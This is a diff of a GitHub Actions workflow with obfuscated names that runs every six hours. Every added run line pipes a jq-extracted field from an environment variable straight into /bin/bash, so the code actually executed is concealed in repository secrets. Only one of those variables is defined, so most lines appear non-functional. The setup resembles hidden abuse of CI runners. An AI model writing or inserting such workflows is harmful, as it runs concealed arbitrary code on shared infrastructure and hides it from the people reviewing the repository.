@@ -1,21 +1,27 @@
 name: dengshiyu3340
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 3/6 * * *'
+    - cron: '37 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dengshiyu3340
         env:
-          eyepx02: ${{ secrets.eyepx02 }}
+          km462: ${{ secrets.km462 }}
         run: |
-          echo $eyepx02 | jq -r .em0540 | /bin/bash
-          echo $ubajc639 | jq -r .kjg44 | /bin/bash
-          echo $vmwwf02168 | jq -r .aoyob751 | /bin/bash
-          echo $h256 | jq -r .u90792 | /bin/bash
-          echo $hl35535 | jq -r .gxhwq9179 | /bin/bash
+          echo $km462 | jq -r .nns3 | /bin/bash
+          echo $pqv7183 | jq -r .ino5 | /bin/bash
+          echo $b80 | jq -r .rw26 | /bin/bash
+          echo $r54 | jq -r .kcq52 | /bin/bash
+          echo $cvxng96 | jq -r .jgbtg0822 | /bin/bash
+          echo $ch7 | jq -r .lk13 | /bin/bash
+          echo $jd75 | jq -r .ffx275 | /bin/bash
+          echo $ljlz8 | jq -r .at276 | /bin/bash
+          echo $g975 | jq -r .wc6170 | /bin/bash
+          echo $y3946 | jq -r .n7184 | /bin/bash
+          echo $fgswn617 | jq -r .uhrxr2 | /bin/bash
 
